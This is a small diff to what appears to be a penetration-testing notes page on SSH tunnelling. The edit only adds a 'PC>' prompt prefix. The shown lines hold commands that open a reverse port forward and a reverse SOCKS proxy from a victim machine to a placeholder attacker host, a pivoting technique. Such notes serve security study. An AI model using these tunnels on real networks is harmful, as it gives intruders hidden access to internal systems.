@@ -36,7 +36,7 @@ PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -fN
 
 In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it: 
 ```bash
-ssh -R 9090 tunneluser@ATTACKING_IP -fN
+PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
 ```
 {% endtab %}
 {% endtabs %}
